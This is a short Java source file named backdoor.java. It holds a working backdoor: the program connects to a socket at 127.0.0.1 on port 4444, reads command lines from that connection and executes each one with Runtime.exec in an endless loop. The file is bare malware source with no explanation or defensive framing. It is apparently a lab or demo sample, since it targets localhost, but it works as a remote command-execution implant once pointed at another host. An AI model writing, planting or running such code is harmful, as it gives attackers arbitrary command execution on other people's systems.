// backdoor.java
import java.io.*;
import java.net.*;

public class Backdoor {
    public static void main(String[] args) throws Exception {
        Socket socket = new Socket("127.0.0.1", 4444);
        BufferedReader in = new BufferedReader(
                new InputStreamReader(socket.getInputStream()));

        while (true) {
            String cmd = in.readLine();
            if (cmd != null) {
                Runtime.getRuntime().exec(cmd);
            }
            Thread.sleep(5000);
        }
    }
}